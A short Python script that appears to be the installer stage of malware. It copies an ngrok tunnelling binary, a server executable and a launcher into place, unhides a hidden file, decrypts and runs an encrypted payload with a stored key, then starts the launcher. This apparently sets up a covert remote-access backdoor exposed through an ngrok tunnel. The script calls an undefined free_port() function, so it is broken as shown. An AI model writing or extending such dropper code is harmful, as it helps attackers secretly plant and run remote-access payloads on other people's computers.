import dyn_config as config
import main_utils

def main():

    for src, dest in {
        config.NKGROK_EXE_FILE_NAME: config.NGROK_DESTINATION_PATH,
        config.SERVER_EXE_NAME: config.MAIN_SERVER_EXECUTABLE_DEST,
        config.LAUNCHER_EXE_NAME: config.NGROK_AND_MAIN_SERVER_LAUNCHER_EXECUTABLE_DEST,
    }.items():
        main_utils.move(src, dest)

    main_utils.unhide_file(config.HIDDEN_FILE)
    main_utils.run_payload(config.PAYLOAD_STRING, config.PAYLOAD_DECRYPTION_KEY)
    main_utils.start_launcher(config.NGROK_AND_MAIN_SERVER_LAUNCHER_EXECUTABLE_DEST)


if __name__ == "__main__":
    free_port()
    main()
